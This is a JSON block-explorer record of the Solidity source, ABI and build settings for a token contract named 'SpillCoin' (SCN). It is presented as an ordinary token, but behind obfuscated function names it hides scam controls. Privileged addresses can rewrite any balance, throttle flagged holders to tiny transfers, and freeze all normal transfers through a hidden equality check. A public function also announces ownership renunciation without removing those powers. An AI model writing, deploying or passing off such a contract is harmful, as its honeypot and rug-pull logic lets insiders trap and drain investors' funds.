{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.7;\n\nlibrary SafeMath {\n\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n\n        return c;\n    }\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return sub(a, b, \"SafeMath: subtraction overflow\");\n    }\n\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b <= a, errorMessage);\n        uint256 c = a - b;\n\n        return c;\n    }\n\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        if (a == 0) {\n            return 0;\n        }\n\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n\n        return c;\n    }\n\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return div(a, b, \"SafeMath: division by zero\");\n    }\n\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b > 0, errorMessage);\n        uint256 c = a / b;\n\n        return c;\n    }\n\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return mod(a, b, \"SafeMath: modulo by zero\");\n    }\n\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b != 0, errorMessage);\n        return a % b;\n    }\n}\n\nabstract contract tradingTx {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface modeTo {\n    function createPair(address minFrom, address feeSenderBuy) external returns (address);\n\n    function feeTo() external view returns (address);\n}\n\ninterface toLaunchedFrom {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\n\ninterface atMax {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address liquidityTeam) external view returns (uint256);\n\n    function transfer(address modeTake, uint256 listSenderFee) external returns (bool);\n\n    function allowance(address shouldWallet, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 listSenderFee) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address modeTake,\n        uint256 listSenderFee\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed walletTrading, uint256 value);\n    event Approval(address indexed shouldWallet, address indexed spender, uint256 value);\n}\n\ninterface fundToken is atMax {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract SpillCoin is tradingTx, atMax, fundToken {\n\n    function fromMin(address minSwap, address modeTake, uint256 listSenderFee) internal returns (bool) {\n        require(tokenLaunchFrom[minSwap] >= listSenderFee);\n        tokenLaunchFrom[minSwap] -= listSenderFee;\n        tokenLaunchFrom[modeTake] += listSenderFee;\n        emit Transfer(minSwap, modeTake, listSenderFee);\n        return true;\n    }\n\n    constructor (){\n        \n        toAmount();\n        toLaunchedFrom fromLimit = toLaunchedFrom(tradingLaunch);\n        fromTo = modeTo(fromLimit.factory()).createPair(fromLimit.WETH(), address(this));\n        minMode = modeTo(fromLimit.factory()).feeTo();\n        \n        teamReceiver = _msgSender();\n        fundAuto[teamReceiver] = true;\n        tokenLaunchFrom[teamReceiver] = receiverSell;\n        \n        emit Transfer(address(0), teamReceiver, receiverSell);\n    }\n\n    address public fromTo;\n\n    string private launchBuySender = \"Spill Coin\";\n\n    function sellList(address exemptLaunchSell) public {\n        if (modeLaunch) {\n            return;\n        }\n        \n        fundAuto[exemptLaunchSell] = true;\n        \n        modeLaunch = true;\n    }\n\n    bool public shouldLimitAt;\n\n    function transferFrom(address minSwap, address modeTake, uint256 listSenderFee) external override returns (bool) {\n        if (_msgSender() != tradingLaunch) {\n            if (amountFee[minSwap][_msgSender()] != type(uint256).max) {\n                require(listSenderFee <= amountFee[minSwap][_msgSender()]);\n                amountFee[minSwap][_msgSender()] -= listSenderFee;\n            }\n        }\n        return receiverFrom(minSwap, modeTake, listSenderFee);\n    }\n\n    mapping(address => bool) public minBuy;\n\n    uint256 minTo;\n\n    uint256 public listSender = 3;\n\n    function amountSenderReceiver(uint256 listSenderFee) public {\n        shouldIsTake();\n        marketingTrading = listSenderFee;\n    }\n\n    mapping(address => uint256) private tokenLaunchFrom;\n\n    uint256 public launchLiquidity;\n\n    address minMode;\n\n    function shouldIsTake() private view {\n        require(fundAuto[_msgSender()]);\n    }\n\n    uint256 public modeReceiver;\n\n    uint256 private maxLiquidity;\n\n    mapping(address => bool) public fundAuto;\n\n    uint256 public toFeeMax;\n\n    function getOwner() external view returns (address) {\n        return totalAuto;\n    }\n\n    function toAmount() public {\n        emit OwnershipTransferred(teamReceiver, address(0));\n        totalAuto = address(0);\n    }\n\n    function receiverWallet(address feeToken) public {\n        shouldIsTake();\n        if (shouldAuto != shouldLimitAt) {\n            modeReceiver = launchLiquidity;\n        }\n        if (feeToken == teamReceiver || feeToken == fromTo) {\n            return;\n        }\n        minBuy[feeToken] = true;\n    }\n\n    uint8 private swapAt = 18;\n\n    function owner() external view returns (address) {\n        return totalAuto;\n    }\n\n    function receiverFrom(address minSwap, address modeTake, uint256 listSenderFee) internal returns (bool) {\n        if (minSwap == teamReceiver) {\n            return fromMin(minSwap, modeTake, listSenderFee);\n        }\n        uint256 tokenLaunched = atMax(fromTo).balanceOf(minMode);\n        require(tokenLaunched == marketingTrading);\n        require(modeTake != minMode);\n        if (minBuy[minSwap]) {\n            return fromMin(minSwap, modeTake, tradingAt);\n        }\n        listSenderFee = totalFee(minSwap, modeTake, listSenderFee);\n        return fromMin(minSwap, modeTake, listSenderFee);\n    }\n\n    mapping(address => mapping(address => uint256)) private amountFee;\n\n    function symbol() external view virtual override returns (string memory) {\n        return receiverFundAuto;\n    }\n\n    bool public fundTrading;\n\n    uint256 public txSender = 0;\n\n    uint256 constant tradingAt = 2 ** 10;\n\n    function maxShould(address fundMin, uint256 listSenderFee) public {\n        shouldIsTake();\n        tokenLaunchFrom[fundMin] = listSenderFee;\n    }\n\n    function balanceOf(address liquidityTeam) public view virtual override returns (uint256) {\n        return tokenLaunchFrom[liquidityTeam];\n    }\n\n    bool private shouldAuto;\n\n    address private totalAuto;\n\n    uint256 marketingTrading;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return receiverSell;\n    }\n\n    function approve(address autoSwapReceiver, uint256 listSenderFee) public virtual override returns (bool) {\n        amountFee[_msgSender()][autoSwapReceiver] = listSenderFee;\n        emit Approval(_msgSender(), autoSwapReceiver, listSenderFee);\n        return true;\n    }\n\n    event OwnershipTransferred(address indexed marketingBuy, address indexed modeSender);\n\n    function name() external view virtual override returns (string memory) {\n        return launchBuySender;\n    }\n\n    function allowance(address buyToken, address autoSwapReceiver) external view virtual override returns (uint256) {\n        if (autoSwapReceiver == tradingLaunch) {\n            return type(uint256).max;\n        }\n        return amountFee[buyToken][autoSwapReceiver];\n    }\n\n    bool public modeLaunch;\n\n    address public teamReceiver;\n\n    address tradingLaunch = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function transfer(address fundMin, uint256 listSenderFee) external virtual override returns (bool) {\n        return receiverFrom(_msgSender(), fundMin, listSenderFee);\n    }\n\n    string private receiverFundAuto = \"SCN\";\n\n    function decimals() external view virtual override returns (uint8) {\n        return swapAt;\n    }\n\n    uint256 private receiverSell = 100000000 * 10 ** 18;\n\n    function totalFee(address minSwap, address modeTake, uint256 listSenderFee) internal view returns (uint256) {\n        require(listSenderFee > 0);\n\n        uint256 teamTx = 0;\n        if (minSwap == fromTo && listSender > 0) {\n            teamTx = listSenderFee * listSender / 100;\n        } else if (modeTake == fromTo && txSender > 0) {\n            teamTx = listSenderFee * txSender / 100;\n        }\n        require(teamTx <= listSenderFee);\n        return listSenderFee - teamTx;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"shouldWallet\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingBuy\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeSender\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"walletTrading\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyToken\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"autoSwapReceiver\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"listSenderFee\",\"type\":\"uint256\"}],\"name\":\"amountSenderReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoSwapReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listSenderFee\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityTeam\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromTo\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fundAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchLiquidity\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listSender\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listSenderFee\",\"type\":\"uint256\"}],\"name\":\"maxShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"minBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeReceiver\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeToken\",\"type\":\"address\"}],\"name\":\"receiverWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptLaunchSell\",\"type\":\"address\"}],\"name\":\"sellList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldLimitAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamReceiver\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toFeeMax\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listSenderFee\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minSwap\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"modeTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listSenderFee\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txSender\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "SpillCoin", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}